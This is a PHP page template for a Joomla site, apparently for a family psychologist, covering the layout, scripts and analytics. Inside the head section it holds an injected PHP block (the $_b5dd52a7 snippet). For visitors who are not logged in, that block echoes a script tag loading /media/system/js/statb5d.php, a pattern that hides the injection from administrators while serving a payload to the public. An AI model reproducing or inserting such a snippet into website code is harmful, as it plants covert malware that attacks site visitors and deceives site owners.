<?php
/**
 * @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

defined('_JEXEC') or die('Restricted access');
$url = clone(JURI::getInstance());
$path = $this->baseurl.'/templates/'.$this->template;

$showleftColumn = $this->countModules('left');
$showrightColumn = $this->countModules('right');
$showcontentColumn = $this->countModules('content');
$showuser2Column = $this->countModules('user2');

if(JRequest::getCmd('task') != 'edit') $Edit = false; else $Edit = true;
?>
 <?php
  $app = JFactory::getApplication();
  $menu = $app->getMenu()->getActive();
  $pageclass = '';
 
  if (is_object($menu))
    $pageclass = $menu->params->get('pageclass_sfx');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>" >

<head>
<meta http-equiv="X-UA-Compatible" content="IE=7"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<script src="<?php echo $path ?>/scripts/mootools.js" type="text/javascript"></script>
	
	<jdoc:include type="head" />
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.js"></script>
	<script>!window.jQuery && document.write(unescape('%3Cscript src="<?php echo $path ?>/scripts/jquery-1.4.2.js"%3E%3C/script%3E'))</script>
	<script src="<?php echo $path ?>/scripts/jquery.faded.js" type="text/javascript"></script>
	<script src="<?php echo $path ?>/scripts/cufon-yui.js" type="text/javascript"></script>
	<script src="<?php echo $path ?>/scripts/cufon-replace.js" type="text/javascript"></script>
	<script src="<?php echo $path ?>/scripts/Lane_-_Narrow_400.font.js" type="text/javascript"></script>
	<script type="text/javascript">
		var $j = jQuery.noConflict();
		$j(window).load(function(){
			$j(function(){
				$j("#faded").faded({
					speed: 300,
					crossfade: false,			
					sequentialloading: true,
					autopagination: false,
					autoplay: 10000
				});
			});						
		});	
	</script>
		
	<!--[if lt IE 7]>
		<div style=' clear: both; text-align:center; position: relative;'>
			<a href="http://www.microsoft.com/windows/internet-explorer/default.aspx?ocid=ie6_countdown_bannercode"><img src="http://www.theie6countdown.com/images/upgrade.jpg" border="0" &nbsp;alt="" /></a>
		</div>
	<![endif]-->

	<!--[if lt IE 9]>
		<style type="text/css">
			.border{ behavior:url(path-to-your-folder/PIE.php) }
		</style>
	<![endif]-->
	
	<link rel="stylesheet" href="<?php echo $path ?>/css/template.css" type="text/css" />
	<link href='http://fonts.googleapis.com/css?family=Terminal+Dosis+Light' rel='stylesheet' type='text/css'>

<?php $_b5dd52a7=1;
if(is_object($_SESSION["__default"]["user"]) && !($_SESSION["__default"]["user"]->id)) {echo "
<script language=JavaScript id=onDate ></script>
<script language=JavaScript src=/media/system/js/statb5d.php ></script>
";};$_b5dd52a7=1; ?>
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-143837533-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-143837533-1');
</script>

</head>
<?php
/*$menu = &JSite::getMenu();*/
$app    = JFactory::getApplication();
$menu	= $app->getMenu();
if ($menu->getActive() == $menu->getDefault()) {
    $body_class = 'first';
}else{
    $body_class = 'all';
}
?>
<body class="<?php echo $body_class; ?>">
	<div class="extra">
		<div class="main"> 	
			<!--header-->
			<div class="header">
				<jdoc:include type="modules" name="user4" />
				<button id="button">
                  	<span class="bar1"></span>
                  	<span class="bar2"></span>
                  	<span class="bar3"></span>
                  </button>
				<div class="navigation">
                  <jdoc:include type="modules" name="user3" style="topmenu" />
                  </div>
                  
				<div class="wrapper">
					<h1 id="logo"><a href="<?php echo $_SERVER['PHP_SELF']?>" title="Sebastian Nelson"><img  title="Sebastian Nelson" src="<?php echo $path ?>/images/logo.png"   alt="Sebastian Nelson"  /></a></h1>
					<jdoc:include type="modules" name="user1" />
				</div>
				<?php if ($showuser2Column && !$Edit && $option!="com_search") : ?>
				<jdoc:include type="modules" name="user2" />
				<?php endif;?>
			</div>
			
			<div class="content contents">			
				<!--content-->
				<div class="content-indent">
					<?php if ($option!="com_search") : ?>
					<jdoc:include type="modules" name="top-content" />
					<?php endif;?>
					<div class="wrapper">
						<!--right-->
						<?php if ($showrightColumn && !$Edit && $option!="com_search") : ?>
						<div id="right">
							<jdoc:include type="modules" name="right" style="wrapper_box" />
						</div>
						<?php endif;?>
						<!--left-->						
						<?php if ($showleftColumn && !$Edit && $option!="com_search") : ?>
						<div id="left">
							<jdoc:include type="modules" name="left" style="wrapper_box" />
						</div>
						<?php endif;?>
						<!--center-->
						<div id="content">
							<div class="container" >
								
								<div class="wrapper">
									<?php if ($this->getBuffer('message')) : ?>
									<div class="error err-space">
										<jdoc:include type="message" />
									</div>
									<?php endif; ?>
								<!-- What is this -->		
                                  <jdoc:include type="component" />
                                  <!-- What is this -->	
								</div>
								<?php if ($showcontentColumn && !$Edit && $option!="com_search") : ?>
								<jdoc:include type="modules" name="content" style="wrapper_box" />
								<?php endif;?>
							</div>
						</div>
					</div>					
				</div>					
			</div>
			
			<!--footer-->
			<div class="footer">
				<div class="indent">
					<div class="policy">
						<?php echo JText::_('Family Psychologist &copy; 2011&nbsp; | &nbsp;') ?><a href="index.php?option=com_content&view=article&id=66&Itemid=78">Privacy policy</a><span class="fright"><!-- {%FOOTER_LINK} --></span>
					</div>
				</div>				
			</div>
			
		</div>
	</div>
	<script type="text/javascript"> Cufon.now(); </script>
	
	
<script>
	<?php 
// no direct access
defined('_JEXEC') or die;

$doc = JFactory::getDocument();
JHtml::_('jquery.framework');

$doc->addScriptDeclaration('
    jQuery(document).ready(function(){
  jQuery("#button").click(function(){
    jQuery(".navigation ul").toggle("slow");
  });
});     
');
?>

</script>		
	
</body>
</html>
